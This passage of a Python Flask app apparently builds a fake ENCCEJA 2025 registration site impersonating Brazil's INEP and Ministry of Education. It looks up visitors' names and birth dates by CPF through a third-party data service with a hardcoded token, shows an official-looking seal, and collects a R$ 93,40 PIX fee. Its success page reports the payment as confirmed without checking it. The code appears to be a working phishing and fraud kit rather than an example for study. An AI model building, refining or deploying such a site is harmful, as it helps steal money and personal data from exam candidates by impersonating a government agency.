    return redirect(url_for('local_prova'))

@app.route('/local-prova')
def local_prova():
    """Seleção do local de prova"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    app.logger.info("[VPS-UBUNTU] Renderizando local-prova")
    endereco = session.get('endereco_data', {})
    
    return f'''<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ENCCEJA 2025 - Selecionar Local de Prova</title>
    <style>
        * {{ box-sizing: border-box; margin: 0; padding: 0; }}
        body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f8f9fa; line-height: 1.6; }}
        .container {{ max-width: 700px; margin: 0 auto; padding: 20px; }}
        
        .header {{ 
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%); 
            color: white; padding: 30px 20px; text-align: center; 
            border-radius: 12px; margin-bottom: 30px; box-shadow: 0 4px 20px rgba(0,0,0,0.1);
        }}
        .header h1 {{ font-size: 2rem; font-weight: 700; margin-bottom: 10px; }}
        
        .form-container {{ 
            background: white; padding: 40px; border-radius: 12px; 
            box-shadow: 0 4px 20px rgba(0,0,0,0.08); margin-bottom: 30px;
        }}
        
        .location-info {{ 
            background: linear-gradient(135deg, #e3f2fd 0%, #f0f8ff 100%); 
            border: 1px solid #bee5eb; padding: 20px; border-radius: 8px; 
            margin: 20px 0; border-left: 4px solid #2a5298;
        }}
        .location-info p {{ color: #0c5460; font-weight: 500; }}
        
        .form-group {{ margin-bottom: 25px; }}
        .form-group label {{ 
            display: block; margin-bottom: 8px; font-weight: 600; 
            color: #34495e; font-size: 1rem;
        }}
        .form-group select {{ 
            width: 100%; padding: 15px; font-size: 1.1rem; 
            border: 2px solid #e1e8ed; border-radius: 8px; 
            transition: border-color 0.3s, box-shadow 0.3s;
        }}
        .form-group select:focus {{ 
            outline: none; border-color: #2a5298; 
            box-shadow: 0 0 0 3px rgba(42, 82, 152, 0.1);
        }}
        
        .required {{ color: #dc3545; font-weight: bold; }}
        
        .warning-box {{ 
            background: linear-gradient(135deg, #fff3cd 0%, #fef9e7 100%); 
            border: 1px solid #ffeaa7; padding: 20px; border-radius: 8px; 
            margin: 20px 0; border-left: 4px solid #856404;
        }}
        .warning-box p {{ color: #856404; margin-bottom: 10px; }}
        
        .btn {{ 
            background: linear-gradient(135deg, #28a745 0%, #20c997 100%); 
            color: white; padding: 15px 30px; font-size: 1.1rem; 
            border: none; border-radius: 8px; cursor: pointer; 
            width: 100%; font-weight: 600; text-transform: uppercase;
            transition: all 0.3s; box-shadow: 0 4px 15px rgba(40, 167, 69, 0.3);
        }}
        .btn:hover {{ 
            transform: translateY(-2px); 
            box-shadow: 0 6px 20px rgba(40, 167, 69, 0.4);
        }}
        
        @media (max-width: 768px) {{
            .container {{ padding: 15px; }}
            .form-container {{ padding: 25px 20px; }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Selecionar Local de Prova</h1>
            <p>Escolha o local mais próximo para realizar o ENCCEJA 2025</p>
        </div>
        
        <div class="form-container">
            <div class="location-info">
                <p><strong>📍 Seu endereço informado:</strong></p>
                <p>{endereco.get('cidade', 'Não informado')}, {endereco.get('uf', 'N/A')} - CEP: {endereco.get('cep', 'N/A')}</p>
            </div>
            
            <form method="POST" action="/salvar-local">
                <div class="form-group">
                    <label for="local">Escolha o local de prova mais próximo: <span class="required">*</span></label>
                    <select id="local" name="local" required>
                        <option value="">Selecione um local...</option>
                        <option value="escola_municipal_central">🏫 Escola Municipal Prof. Antonio Silva - Centro</option>
                        <option value="escola_estadual_jardim">🏫 Escola Estadual Dr. José Santos - Bairro Jardim</option>
                        <option value="centro_educacional_norte">🏫 Centro Educacional Maria Oliveira - Zona Norte</option>
                        <option value="emef_vila_nova">🏫 EMEF Carlos Drummond de Andrade - Vila Nova</option>
                        <option value="colegio_paulo_freire">🏫 Colégio Estadual Paulo Freire - Distrito Industrial</option>
                        <option value="escola_municipal_sul">🏫 Escola Municipal Dom Pedro II - Zona Sul</option>
                        <option value="instituto_federal">🏫 Instituto Federal - Campus Principal</option>
                        <option value="universidade_estadual">🎓 Universidade Estadual - Campus Central</option>
                    </select>
                </div>
                
                <div class="warning-box">
                    <p><strong>⚠️ Importante sobre o local de prova:</strong></p>
                    <ul style="margin: 10px 0 0 20px;">
                        <li>O local final será confirmado no seu cartão de inscrição</li>
                        <li>O INEP pode alterar o local por questões logísticas</li>
                        <li>Você receberá todas as informações por e-mail e SMS</li>
                        <li>Chegue ao local com 1 hora de antecedência</li>
                    </ul>
                </div>
                
                <button type="submit" class="btn">Confirmar Local e Ir para Pagamento</button>
            </form>
        </div>
    </div>
</body>
</html>'''

@app.route('/salvar-local', methods=['POST'])
def salvar_local():
    """Salvar local de prova"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    local = request.form.get('local', 'escola_municipal_central')
    session['local_prova'] = local
    app.logger.info(f"[VPS-UBUNTU] Local de prova selecionado: {local}")
    
    return redirect(url_for('pagamento'))

@app.route('/pagamento', methods=['GET', 'POST'])
def pagamento():
    """Página de pagamento PIX"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    app.logger.info("[VPS-UBUNTU] Renderizando página de pagamento")
    user_data = session['user_data']
    endereco = session.get('endereco_data', {})
    local_prova = session.get('local_prova', 'escola_municipal_central')
    
    return f'''<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ENCCEJA 2025 - Pagamento da Inscrição</title>
    <style>
        * {{ box-sizing: border-box; margin: 0; padding: 0; }}
        body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f8f9fa; line-height: 1.6; }}
        .container {{ max-width: 800px; margin: 0 auto; padding: 20px; }}
        
        .header {{ 
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%); 
            color: white; padding: 30px 20px; text-align: center; 
            border-radius: 12px; margin-bottom: 30px; box-shadow: 0 4px 20px rgba(0,0,0,0.1);
        }}
        .header h1 {{ font-size: 2.2rem; font-weight: 700; margin-bottom: 10px; }}
        
        .payment-container {{ 
            background: white; padding: 40px; border-radius: 12px; 
            box-shadow: 0 4px 20px rgba(0,0,0,0.08); margin-bottom: 30px;
        }}
        
        .summary-box {{ 
            background: linear-gradient(135deg, #e8f4fd 0%, #f0f8ff 100%); 
            border-left: 5px solid #2a5298; padding: 25px; margin: 25px 0; 
            border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.05);
        }}
        .summary-box h3 {{ color: #2a5298; margin-bottom: 15px; }}
        .summary-box p {{ margin-bottom: 8px; color: #2c3e50; }}
        .summary-box .highlight {{ color: #d73527; font-weight: bold; font-size: 1.4rem; }}
        
        .payment-info {{ 
            background: linear-gradient(135deg, #d4edda 0%, #f8f9fa 100%); 
            border: 1px solid #c3e6cb; padding: 25px; border-radius: 8px; 
            margin: 25px 0; border-left: 4px solid #28a745;
        }}
        .payment-info h3 {{ color: #28a745; margin-bottom: 15px; }}
        
        .btn {{ 
            background: linear-gradient(135deg, #28a745 0%, #20c997 100%); 
            color: white; padding: 15px 30px; font-size: 1.1rem; 
            border: none; border-radius: 8px; cursor: pointer; 
            width: 100%; font-weight: 600; text-transform: uppercase;
            transition: all 0.3s; box-shadow: 0 4px 15px rgba(40, 167, 69, 0.3);
        }}
        .btn:hover {{ 
            transform: translateY(-2px); 
            box-shadow: 0 6px 20px rgba(40, 167, 69, 0.4);
        }}
        .btn:disabled {{ 
            background: #6c757d; cursor: not-allowed; 
            transform: none; box-shadow: none;
        }}
        
        .loading {{ 
            display: none; text-align: center; margin: 20px 0; 
            color: #2a5298; font-weight: 500;
        }}
        .loading::after {{
            content: ''; display: inline-block; width: 20px; height: 20px; 
            border: 3px solid #f3f3f3; border-top: 3px solid #2a5298; 
            border-radius: 50%; animation: spin 1s linear infinite; margin-left: 10px;
        }}
        @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
        
        .qr-result {{ 
            margin: 30px 0; padding: 30px; background: #fff; 
            border: 2px solid #28a745; border-radius: 12px; 
            box-shadow: 0 4px 20px rgba(40, 167, 69, 0.1);
        }}
        .qr-result h4 {{ color: #28a745; margin-bottom: 20px; font-size: 1.3rem; }}
        
        .pix-code {{ 
            background: #f8f9fa; padding: 20px; border: 1px solid #ddd; 
            border-radius: 8px; font-family: 'Courier New', monospace; 
            font-size: 11px; word-break: break-all; margin: 20px 0;
            max-height: 150px; overflow-y: auto;
        }}
        
        .success-btn {{ 
            background: linear-gradient(135deg, #007bff 0%, #0056b3 100%); 
            color: white; padding: 12px 25px; text-decoration: none; 
            border-radius: 6px; display: inline-block; margin-top: 20px;
            font-weight: 600; text-transform: uppercase; font-size: 0.9rem;
            transition: all 0.3s; box-shadow: 0 4px 15px rgba(0, 123, 255, 0.3);
        }}
        .success-btn:hover {{ 
            transform: translateY(-2px); 
            box-shadow: 0 6px 20px rgba(0, 123, 255, 0.4);
            text-decoration: none; color: white;
        }}
        
        .instructions {{ margin: 20px 0; }}
        .instructions ol {{ padding-left: 25px; }}
        .instructions li {{ margin-bottom: 8px; color: #2c3e50; }}
        
        @media (max-width: 768px) {{
            .container {{ padding: 15px; }}
            .payment-container {{ padding: 25px 20px; }}
            .header h1 {{ font-size: 1.8rem; }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>💳 Pagamento da Inscrição</h1>
            <p>ENCCEJA 2025 - Finalize sua inscrição</p>
        </div>
        
        <div class="payment-container">
            <div class="summary-box">
                <h3>📋 Resumo da Inscrição</h3>
                <p><strong>Candidato:</strong> {user_data.get('nome', 'N/A')}</p>
                <p><strong>CPF:</strong> {user_data.get('cpf', 'N/A')}</p>
                <p><strong>Cidade:</strong> {endereco.get('cidade', 'N/A')}, {endereco.get('uf', 'N/A')}</p>
                <p><strong>Exame:</strong> ENCCEJA 2025 - Certificação de Competências</p>
                <p class="highlight">💰 Valor Total: R$ 93,40</p>
                <p><strong>Descrição:</strong> Taxa de Inscrição ENCCEJA 2025</p>
            </div>
            
            <div class="payment-info">
                <h3>🏦 Pagamento via PIX</h3>
                <p><strong>Vantagens do PIX:</strong></p>
                <ul style="margin: 10px 0 0 20px;">
                    <li>✅ Pagamento instantâneo 24h/dia</li>
                    <li>✅ Confirmação automática em segundos</li>
                    <li>✅ Seguro e prático pelo celular</li>
                    <li>✅ Aceito por todos os bancos brasileiros</li>
                </ul>
                <p style="margin-top: 15px;">Clique no botão abaixo para gerar seu código PIX e efetuar o pagamento.</p>
            </div>
            
            <button onclick="gerarPix()" class="btn" id="pixBtn">🔄 Gerar Código PIX</button>
            <div class="loading" id="loading">
                <p>⏳ Gerando código PIX seguro...</p>
                <p>Conectando com a instituição financeira...</p>
            </div>
            
            <div id="qr-result"></div>
        </div>
    </div>
    
    <script>
    function gerarPix() {{
        const loading = document.getElementById('loading');
        const result = document.getElementById('qr-result');
        const btn = document.getElementById('pixBtn');
        
        btn.disabled = true;
        btn.textContent = '⏳ Gerando PIX...';
        loading.style.display = 'block';
        result.innerHTML = '';
        
        fetch('/api/criar-pix', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify({{}})
        }})
        .then(response => response.json())
        .then(data => {{
            loading.style.display = 'none';
            btn.disabled = false;
            btn.textContent = '🔄 Gerar Novo Código PIX';
            
            if (data.success) {{
                result.innerHTML = 
                    '<div class="qr-result">' +
                    '<h4>✅ Código PIX Gerado com Sucesso!</h4>' +
                    '<div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin: 20px 0;">' +
                    '<div>' +
                    '<p><strong>💰 Valor:</strong> R$ ' + data.amount.toFixed(2) + '</p>' +
                    '<p><strong>🆔 ID da Transação:</strong> ' + data.transactionId + '</p>' +
                    '<p><strong>⚙️ Sistema:</strong> ' + (data.method === 'witepay' ? 'WitePay API' : 'PIX Direto') + '</p>' +
                    '<p><strong>⏰ Válido até:</strong> 30 minutos</p>' +
                    '</div>' +
                    '<div style="text-align: center;">' +
                    (data.qrCodeImage ? '<img src="' + data.qrCodeImage + '" style="max-width: 150px; border: 1px solid #ddd; border-radius: 8px;">' : '<p style="color: #6c757d;">QR Code não disponível</p>') +
                    '</div>' +
                    '</div>' +
                    '<div class="pix-code">' +
                    '<strong>📱 Código PIX (Copia e Cola):</strong><br>' +
                    '<textarea readonly style="width:100%; height:120px; font-size:11px; font-family:monospace; border:none; background:transparent; resize:none;">' + data.pixCode + '</textarea>' +
                    '</div>' +
                    '<div class="instructions">' +
                    '<h4 style="color: #2a5298; margin: 20px 0 15px 0;">📋 Como Pagar:</h4>' +
                    '<ol>' +
                    '<li><strong>Copie</strong> o código PIX acima (selecione tudo e Ctrl+C)</li>' +
                    '<li><strong>Abra</strong> o aplicativo do seu banco no celular</li>' +
                    '<li><strong>Procure</strong> por "PIX" e escolha "Copia e Cola" ou "Código PIX"</li>' +
                    '<li><strong>Cole</strong> o código copiado e confirme o pagamento</li>' +
                    '<li><strong>Guarde</strong> o comprovante de pagamento</li>' +
                    '</ol>' +
                    '<p style="margin: 15px 0; color: #28a745; font-weight: bold;">✅ Após o pagamento, sua inscrição será confirmada automaticamente!</p>' +
                    '</div>' +
                    '<div style="text-align: center;">' +
                    '<a href="/inscricao-sucesso" class="success-btn">✅ Finalizar Inscrição</a>' +
                    '</div>' +
                    '</div>';
            }} else {{
                result.innerHTML = 
                    '<div style="color:red; text-align:center; padding:30px; background:#f8d7da; border-radius:8px;">' +
                    '<h4>❌ Erro na Geração do PIX</h4>' +
                    '<p><strong>Detalhes:</strong> ' + data.error + '</p>' +
                    '<p style="margin-top: 15px;">Tente novamente ou entre em contato com o suporte.</p>' +
                    '</div>';
            }}
        }})
        .catch(error => {{
            loading.style.display = 'none';
            btn.disabled = false;
            btn.textContent = '🔄 Gerar Código PIX';
            result.innerHTML = 
                '<div style="color:red; text-align:center; padding:30px; background:#f8d7da; border-radius:8px;">' +
                '<h4>❌ Erro de Conexão</h4>' +
                '<p>Não foi possível conectar com o servidor de pagamentos.</p>' +
                '<p>Verifique sua conexão e tente novamente.</p>' +
                '</div>';
            console.error('Erro na geração do PIX:', error);
        }});
    }}
    </script>
</body>
</html>'''

@app.route('/inscricao-sucesso')
def inscricao_sucesso():
    """Página de sucesso da inscrição"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    app.logger.info("[VPS-UBUNTU] Renderizando página de sucesso")
    user_data = session['user_data']
    endereco = session.get('endereco_data', {})
    
    return f'''<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ENCCEJA 2025 - Inscrição Concluída com Sucesso</title>
    <style>
        * {{ box-sizing: border-box; margin: 0; padding: 0; }}
        body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f8f9fa; line-height: 1.6; }}
        .container {{ max-width: 900px; margin: 0 auto; padding: 20px; }}
        
        .header {{ 
            background: linear-gradient(135deg, #28a745 0%, #20c997 100%); 
            color: white; padding: 40px 20px; text-align: center; 
            border-radius: 12px; margin-bottom: 30px; box-shadow: 0 4px 20px rgba(40, 167, 69, 0.2);
        }}
        .header h1 {{ font-size: 2.5rem; font-weight: 700; margin-bottom: 15px; }}
        .header p {{ font-size: 1.2rem; opacity: 0.95; }}
        
        .success-container {{ 
            background: white; padding: 40px; border-radius: 12px; 
            box-shadow: 0 4px 20px rgba(0,0,0,0.08); margin-bottom: 30px;
        }}
        
        .celebration {{ 
            background: linear-gradient(135deg, #d4edda 0%, #f8f9fa 100%); 
            border: 2px solid #c3e6cb; padding: 30px; border-radius: 12px; 
            text-align: center; margin: 30px 0; box-shadow: 0 4px 15px rgba(212, 237, 218, 0.3);
        }}
        .celebration h2 {{ color: #28a745; font-size: 1.8rem; margin-bottom: 15px; }}
        .celebration .inscription-number {{ 
            color: #d73527; font-weight: bold; font-size: 1.4rem; 
            background: #fff; padding: 10px 20px; border-radius: 25px; 
            display: inline-block; margin-top: 15px; border: 2px solid #28a745;
        }}
        
        .info-grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; margin: 30px 0; }}
        .info-card {{ background: #f8f9fa; padding: 25px; border-radius: 8px; border-left: 4px solid #2a5298; }}
        .info-card h4 {{ color: #2a5298; margin-bottom: 10px; font-size: 1.1rem; }}
        .info-card p {{ color: #2c3e50; margin-bottom: 5px; }}
        
        .next-steps {{ 
            background: linear-gradient(135deg, #fff3cd 0%, #fef9e7 100%); 
            border: 1px solid #ffeaa7; padding: 30px; border-radius: 12px; 
            margin: 30px 0; border-left: 5px solid #856404;
        }}
        .next-steps h3 {{ color: #856404; margin-bottom: 20px; font-size: 1.4rem; }}
        .next-steps ol {{ padding-left: 25px; }}
        .next-steps li {{ margin-bottom: 12px; color: #2c3e50; line-height: 1.5; }}
        
        .contact-info {{ 
            background: linear-gradient(135deg, #e3f2fd 0%, #f0f8ff 100%); 
            border: 1px solid #bee5eb; padding: 25px; border-radius: 8px; 
            margin: 25px 0; border-left: 4px solid #2a5298;
        }}
        .contact-info h3 {{ color: #2a5298; margin-bottom: 15px; }}
        .contact-info p {{ color: #0c5460; margin-bottom: 8px; }}
        .contact-info a {{ color: #2a5298; text-decoration: none; font-weight: bold; }}
        .contact-info a:hover {{ text-decoration: underline; }}
        
        .gov-seal {{ 
            text-align: center; padding: 30px; border-top: 2px solid #e9ecef; 
            margin-top: 40px; background: linear-gradient(135deg, #f8f9fa 0%, #ffffff 100%);
            border-radius: 8px;
        }}
        .gov-seal p {{ color: #2c3e50; margin-bottom: 10px; }}
        .gov-seal .seal {{ font-size: 2px; color: #6c757d; margin: 20px 0; }}
        
        .highlight {{ color: #d73527; font-weight: bold; }}
        
        @media (max-width: 768px) {{
            .container {{ padding: 15px; }}
            .success-container {{ padding: 25px 20px; }}
            .header h1 {{ font-size: 2rem; }}
            .info-grid {{ grid-template-columns: 1fr; }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🎉 Inscrição Realizada com Sucesso!</h1>
            <p>ENCCEJA 2025 - Certificação de Competências de Jovens e Adultos</p>
            <p style="font-size: 1rem; margin-top: 10px; opacity: 0.9;">Instituto Nacional de Estudos e Pesquisas Educacionais Anísio Teixeira</p>
        </div>
        
        <div class="success-container">
            <div class="celebration">
                <h2>🏆 Parabéns, {user_data.get('nome', 'Candidato')}!</h2>
                <p style="font-size: 1.1rem; color: #2c3e50; margin-bottom: 15px;">Sua inscrição no ENCCEJA 2025 foi processada e confirmada com sucesso!</p>
                <div class="inscription-number">📄 Nº de Inscrição: ENCCEJA{int(time.time())}</div>
            </div>
            
            <h3 style="color: #2a5298; margin: 30px 0 20px 0; font-size: 1.4rem;">📋 Dados da Inscrição Confirmada</h3>
            <div class="info-grid">
                <div class="info-card">
                    <h4>👤 Dados Pessoais</h4>
                    <p><strong>Nome:</strong> {user_data.get('nome', 'N/A')}</p>
                    <p><strong>CPF:</strong> {user_data.get('cpf', 'N/A')}</p>
                    <p><strong>Nascimento:</strong> {user_data.get('dataNascimento', 'N/A')}</p>
                </div>
                
                <div class="info-card">
                    <h4>📍 Localização</h4>
                    <p><strong>Cidade:</strong> {endereco.get('cidade', 'N/A')}</p>
                    <p><strong>Estado:</strong> {endereco.get('uf', 'N/A')}</p>
                    <p><strong>CEP:</strong> {endereco.get('cep', 'N/A')}</p>
                </div>
                
                <div class="info-card">
                    <h4>💰 Pagamento</h4>
                    <p><strong>Valor:</strong> R$ 93,40</p>
                    <p><strong>Método:</strong> PIX</p>
                    <p><strong>Status:</strong> <span style="color: #28a745;">✅ Confirmado</span></p>
                </div>
                
                <div class="info-card">
                    <h4>📅 Cronograma</h4>
                    <p><strong>Inscrições:</strong> Jan-Mar 2025</p>
                    <p><strong>Prova:</strong> Maio 2025</p>
                    <p><strong>Resultado:</strong> Jul 2025</p>
                </div>
            </div>
            
            <div class="next-steps">
                <h3>📋 Próximos Passos Importantes</h3>
                <ol>
                    <li><strong>Aguarde o cartão de confirmação de inscrição</strong><br>
                        <small>Será enviado até 7 dias antes da prova por e-mail e SMS</small></li>
                    
                    <li><strong>Verifique local, data e horário da prova</strong><br>
                        <small>Todas as informações detalhadas estarão no cartão de confirmação</small></li>
                    
                    <li><strong>Prepare-se para o exame</strong><br>
                        <small>Revise os conteúdos das áreas de conhecimento do ensino fundamental/médio</small></li>
                    
                    <li><strong>Documentos obrigatórios no dia da prova</strong><br>
                        <small>RG, CPF ou outro documento oficial com foto + caneta esferográfica azul/preta</small></li>
                    
                    <li><strong>Acompanhe seu e-mail e telefone</strong><br>
                        <small>Comunicações oficiais serão enviadas pelos canais informados</small></li>
                </ol>
            </div>
            
            <div class="contact-info">
                <h3>📞 Informações e Suporte Oficial</h3>
                <p><strong>Portal do INEP:</strong> <a href="https://www.gov.br/inep" target="_blank">www.gov.br/inep</a></p>
                <p><strong>Central de Atendimento:</strong> 0800 616 161</p>
                <p><strong>Horário de Funcionamento:</strong> Segunda a sexta-feira, das 8h às 20h</p>
                <p><strong>E-mail de Suporte:</strong> atendimento@inep.gov.br</p>
                <p style="margin-top: 15px; color: #856404;"><strong>⚠️ Importante:</strong> Guarde este comprovante de inscrição para seus registros pessoais.</p>
            </div>
            
            <div class="gov-seal">
                <p><strong>🇧🇷 INSTITUTO NACIONAL DE ESTUDOS E PESQUISAS EDUCACIONAIS ANÍSIO TEIXEIRA</strong></p>
                <p><strong>MINISTÉRIO DA EDUCAÇÃO - GOVERNO FEDERAL</strong></p>
                <div class="seal">🛡️</div>
                <p style="font-style: italic; color: #6c757d; font-size: 0.9rem;">
                    Sistema Oficial de Inscrições ENCCEJA 2025<br>
                    Inscrição realizada em {datetime.now().strftime('%d/%m/%Y às %H:%M')}
                </p>
                <p style="margin-top: 20px; font-weight: bold; color: #28a745; font-size: 1.1rem;">
                    🎓 Boa sorte em seu exame! O conhecimento transforma vidas.
                </p>
            </div>
        </div>
    </div>
</body>
</html>'''

# === APIS ===

@app.route('/api/consultar-cpf')
def consultar_cpf_api():
    """API para consulta de CPF - URL corrigida com logging detalhado"""
    cpf = request.args.get('cpf')
    if not cpf:
        app.logger.error("[VPS-UBUNTU] CPF não fornecido na requisição")
        return jsonify({"success": False, "error": "CPF não fornecido"}), 400
    
    try:
        # Limpar CPF
        cpf_numerico = re.sub(r'\D', '', cpf)
        app.logger.info(f"[VPS-UBUNTU] Consultando CPF: {cpf_numerico}")
        
        # API real funcionando
        token = "1285fe4s-e931-4071-a848-3fac8273c55a"
        url = f"https://consulta.fontesderenda.blog/cpf.php?cpf={cpf_numerico}&token={token}"
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'pt-BR,pt;q=0.9,en;q=0.8',
            'Connection': 'keep-alive',
            'Referer': 'https://consulta.fontesderenda.blog/'
        }
        
        app.logger.info(f"[VPS-UBUNTU] Fazendo requisição para: {url}")
        
        response = requests.get(url, headers=headers, timeout=20)
        app.logger.info(f"[VPS-UBUNTU] Status da resposta: {response.status_code}")
        
        if response.status_code == 200:
            try:
                data = response.json()
                app.logger.info(f"[VPS-UBUNTU] Dados recebidos: {data}")
                
                # Verificar estrutura da resposta
                if data.get("DADOS"):
                    dados = data["DADOS"]
                    user_data = {
                        'cpf': dados.get('cpf', cpf_numerico),
                        'nome': dados.get('nome', ''),
                        'dataNascimento': dados.get('data_nascimento', '').split(' ')[0] if dados.get('data_nascimento') else '',
                        'situacaoCadastral': "REGULAR",
                        'success': True
                    }
                    
                    # Salvar na sessão
                    session['user_data'] = user_data
                    
                    app.logger.info(f"[VPS-UBUNTU] CPF consultado com sucesso: {user_data['nome']}")
                    return jsonify(user_data)
                else:
                    app.logger.error(f"[VPS-UBUNTU] Estrutura de resposta inválida: {data}")
                    return jsonify({"success": False, "error": "CPF não encontrado na base de dados"}), 404
                    
            except json.JSONDecodeError as e:
                app.logger.error(f"[VPS-UBUNTU] Erro ao decodificar JSON: {e}")
                app.logger.error(f"[VPS-UBUNTU] Resposta raw: {response.text[:500]}")
                return jsonify({"success": False, "error": "Erro no formato da resposta da API"}), 500
        else:
            app.logger.error(f"[VPS-UBUNTU] API retornou erro: {response.status_code} - {response.text[:200]}")
            return jsonify({"success": False, "error": f"Erro na consulta - Status: {response.status_code}"}), 500
    
    except requests.exceptions.Timeout:
        app.logger.error("[VPS-UBUNTU] Timeout na consulta CPF")
        return jsonify({"success": False, "error": "Timeout na consulta - Tente novamente"}), 500
    except requests.exceptions.RequestException as e:
        app.logger.error(f"[VPS-UBUNTU] Erro de conexão: {e}")
        return jsonify({"success": False, "error": "Erro de conexão com a API"}), 500
    except Exception as e:
        app.logger.error(f"[VPS-UBUNTU] Erro geral na consulta CPF: {e}")
        return jsonify({"success": False, "error": "Erro interno do servidor"}), 500

@app.route('/api/criar-pix', methods=['POST'])
def criar_pix_api():
    """API para criar pagamento PIX"""
    try:
        user_data = session.get('user_data', {})
        
        if not user_data:
            app.logger.error("[VPS-UBUNTU] Tentativa de criar PIX sem dados do usuário")
            return jsonify({'success': False, 'error': 'Dados do usuário não encontrados na sessão'}), 400
        
        app.logger.info(f"[VPS-UBUNTU] Criando PIX para: {user_data.get('nome', 'N/A')}")
        
        # Criar pagamento
        payment_result = create_witepay_payment_robust(user_data, 93.40)
        
        app.logger.info(f"[VPS-UBUNTU] Resultado do pagamento: {payment_result.get('method', 'unknown')} - {payment_result.get('success', False)}")
        
        return jsonify(payment_result)
        
    except Exception as e:
        app.logger.error(f"[VPS-UBUNTU] Erro ao criar PIX: {e}")
        return jsonify({'success': False, 'error': f'Erro interno: {str(e)}'}), 500

# === ROTAS DE SISTEMA ===

@app.route('/status')
def status():
    """Status da aplicação"""
    return jsonify({
        'status': 'online',
        'projeto': 'ENCCEJA 2025 - VPS Ubuntu Completo',
        'versao': '2.0.0',
        'plataforma': 'VPS Ubuntu Hostinger',
        'api_cpf': 'https://consulta.fontesderenda.blog/cpf.php',
        'token_cpf': '1285fe4s-e931-4071-a848-3fac8273c55a',
        'payment_system': 'WitePay + Fallback PIX',
        'features': {
            'cpf_api': True,
            'witepay': True,
            'pix_fallback': True,
            'qr_code': True,
            'templates_fallback': True
        },
        'timestamp': datetime.now().isoformat()
    })

@app.route('/health')
def health():
    """Health check para load balancer"""
    return "OK - ENCCEJA VPS Ubuntu Online", 200

@app.route('/test-cpf/<cpf>')
def test_cpf_direct(cpf):
    """Teste direto da API CPF"""
    try:
        token = "1285fe4s-e931-4071-a848-3fac8273c55a"
        url = f"https://consulta.fontesderenda.blog/cpf.php?cpf={cpf}&token={token}"
        
        app.logger.info(f"[VPS-UBUNTU] Teste direto CPF: {url}")
        
        response = requests.get(url, timeout=15)
        
        return jsonify({
            'test_url': url,
            'status_code': response.status_code,
            'response_data': response.json() if response.status_code == 200 else response.text,
            'success': response.status_code == 200
        })
    except Exception as e:
        return jsonify({'error': str(e), 'success': False})

if __name__ == '__main__':
    app.logger.info("=" * 60)
    app.logger.info("[VPS-UBUNTU] ENCCEJA 2025 - DEPLOY COMPLETO INICIANDO")
    app.logger.info("=" * 60)
    app.logger.info("[VPS-UBUNTU] ✅ Plataforma: VPS Ubuntu Hostinger")
    app.logger.info("[VPS-UBUNTU] ✅ API CPF: https://consulta.fontesderenda.blog/cpf.php")
    app.logger.info("[VPS-UBUNTU] ✅ Token CPF: 1285fe4s-e931-4071-a848-3fac8273c55a")
    app.logger.info("[VPS-UBUNTU] ✅ Sistema PIX: WitePay + Fallback")
    app.logger.info("[VPS-UBUNTU] ✅ Templates: Inline + Fallback")
    app.logger.info("[VPS-UBUNTU] ✅ Fluxo: inscricao → encceja-info → validar-dados → endereco → local-prova → pagamento → sucesso")
    app.logger.info("[VPS-UBUNTU] ✅ Valor PIX: R$ 93,40")
    app.logger.info("[VPS-UBUNTU] ✅ Logging: Completo com prefixos VPS-UBUNTU")
    app.logger.info("[VPS-UBUNTU] 🚀 Aplicação otimizada para produção VPS")
    app.logger.info("=" * 60)
    
    # Iniciar aplicação na porta 5000
    app.run(host='0.0.0.0', port=5000, debug=False)